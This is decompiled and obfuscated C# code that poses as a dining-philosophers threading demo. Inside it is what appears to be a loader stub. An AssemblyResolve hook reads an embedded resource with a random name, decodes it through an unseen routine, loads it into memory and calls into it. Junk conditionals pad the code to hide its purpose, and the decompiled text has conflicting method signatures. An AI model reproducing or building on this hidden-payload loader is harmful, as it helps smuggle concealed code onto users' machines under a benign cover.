using System;
using System.IO;
using System.Reflection;
using System.Threading;
using Qrlenbjaxwwlmqvctfuluj;

namespace Pqkadkbbtvyxkzi;

internal sealed class i
{
	private sealed class a
	{
		public string a;

		public a()
		{
			_ = 5;
			if (1 == 0)
			{
			}
			base._002Ector();
		}

		internal bool a(string a)
		{
			_ = 0;
			if (5 == 0)
			{
			}
			_ = 7;
			if (4 == 0)
			{
			}
			return a.EndsWith(this.a);
		}
	}

	private bool[] m_a;

	private int m_b;

	private int m_c;

	private int m_d;

	private int e;

	private char f;

	public i(bool[] a, int b)
	{
		if (7u != 0)
		{
			f = 'T';
		}
		base._002Ector();
		if (3u != 0)
		{
			this.m_a = a;
		}
		if (5u != 0)
		{
			this.m_b = b;
		}
		this.m_c = this.m_b;
		this.m_d = (this.m_b + 1) % 5;
		Console.WriteLine("Filosof {0}, left fork: {1}, right fork: {2}", b, this.m_c.ToString(), this.m_d.ToString());
	}

	public void a()
	{
		if (true)
		{
			this.b();
		}
	}

	private void b()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		_ = 0;
		if (2 == 0)
		{
		}
		currentDomain.AssemblyResolve += a;
	}

	public void c()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
		if (6u != 0)
		{
		}
	}

	public void d()
	{
		Random random = new Random();
		Random random2;
		if (true)
		{
			random2 = random;
		}
		while (true)
		{
			int millisecondsTimeout = random2.Next(1000, 5000);
			if (true)
			{
				Thread.Sleep(millisecondsTimeout);
			}
			if (6u != 0)
			{
				f = 'V';
			}
			lock (this.m_a)
			{
				while (this.m_a[this.m_d] || this.m_a[this.m_c])
				{
					Monitor.Wait(this.m_a);
				}
				this.m_a[this.m_d] = true;
				this.m_a[this.m_c] = true;
				f = 'S';
				e++;
				Monitor.PulseAll(this.m_a);
			}
			Thread.Sleep(random2.Next(1000, 5000));
			lock (this.m_a)
			{
				if (!this.m_a[this.m_d] || !this.m_a[this.m_c])
				{
					throw new InvalidOperationException("What the fuck!");
				}
				this.m_a[this.m_d] = false;
				this.m_a[this.m_c] = false;
				Monitor.PulseAll(this.m_a);
			}
			f = 'T';
		}
	}

	internal char a()
	{
		_ = 6;
		if (1 == 0)
		{
		}
		return f;
	}

	internal int a()
	{
		_ = 5;
		if (6 == 0)
		{
		}
		return e;
	}

	internal int b()
	{
		_ = 6;
		if (2 == 0)
		{
		}
		return this.m_b;
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		a obj = new a();
		a a2;
		if (5u != 0)
		{
			a2 = obj;
		}
		if (uint.MaxValue != 0)
		{
			a2.a = "Pqkadkbbtvyxkzi.Qrlenbjaxwwlmqvctfuluj.dll";
		}
		string? text = Array.Find(GetType().Assembly.GetManifestResourceNames(), a2.a);
		string name = default(string);
		if (0 == 0)
		{
			name = text;
		}
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		return AppDomain.CurrentDomain.Load(h.b(array));
	}
}
